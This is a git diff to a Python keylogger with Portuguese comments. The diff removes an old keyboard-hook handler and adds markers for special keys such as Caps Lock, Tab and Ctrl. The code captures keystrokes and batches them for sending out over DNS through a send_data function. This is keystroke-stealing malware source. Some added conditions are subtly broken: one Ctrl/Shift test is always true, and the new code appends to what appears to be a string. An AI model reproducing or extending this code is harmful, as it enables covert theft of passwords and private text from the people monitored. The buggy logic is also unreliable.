@@ -76,58 +76,6 @@ def send_data(data):
         # Não sei se precisa disso...
         sock.close()
 
-'''def on_key_event(e):
-    global _KEYS, _LAST_KEY
-    
-    # Só envio quando bater o tamanho máximo de envio por DNS
-    if len(_KEYS) >= 30:
-        send_data(_KEYS)
-        _KEYS = ''
-    
-    # Se eu pressionei a tecla ele pega qual foi
-    if e.event_type == keyboard.KEY_DOWN:
-        key = e.name
-        
-        # Se for uma teclas especiais
-        if key == 'space':
-            _KEYS += ' '
-
-        elif key == 'backspace':
-            _KEYS = _KEYS[:-1]
-
-        elif key == 'enter':
-            _KEYS += '\n'
-
-        elif key in ['´', '`', '^', '~', 'ç']:
-            _LAST_KEY = key
-
-        elif key == 'shift':
-            pass
-
-        else:
-            # Pesquisei e nenhuma biblioteca trata direito as acentos...
-            # Esse "Workaround" funciona...
-            if _LAST_KEY:
-                if _LAST_KEY == '´' and key == 'e':
-                    _KEYS += 'é'
-                elif _LAST_KEY == '`' and key == 'a':
-                    _KEYS += 'à'
-                elif _LAST_KEY == '^' and key == 'a':
-                    _KEYS += 'â'
-                elif _LAST_KEY == '~' and key == 'a':
-                    _KEYS += 'ã'
-                elif _LAST_KEY == '´' and key == 'c':
-                    _KEYS += 'ç'
-                else:
-                    _KEYS += _LAST_KEY + key
-
-                _LAST_KEY = None
-            else:
-                _KEYS += key
-    
-    # Apenasas verificando, remover esse print mais tarde
-    print(_KEYS)'''
-
 def on_release(key):
     global _KEYS
 
@@ -161,9 +109,28 @@ def on_release(key):
         elif key == key.backspace:
             _KEYS = _KEYS[:-1]
 
-        #elif key == key.enter:
-            #_KEYS += '/\n'
+        if key == key.caps_lock:
+            _KEYS.append('¥')
 
+        if key == key.num_lock:
+            _KEYS.append('ß')
+
+        if key == key.cmd:
+            _KEYS.append('┤')                                                                       
+
+        if key == key.tab:
+            _KEYS.append('¤')
+
+        if key == key.ctrl_l or key.ctrl_r:
+            _KEYS.append('©')
+
+        if key == key.shift or key.shift_l:
+            _KEYS.append('Þ')
+    
+    # O TECLADO NUMERO ESTÁ RETORNANDO NONE, TENHO QUE CONFERIR OQUE ESTÁ ACONTECENDO
+        if key == None:
+            _KEYS.append('¿')
+            
         else:
             print(key)
 
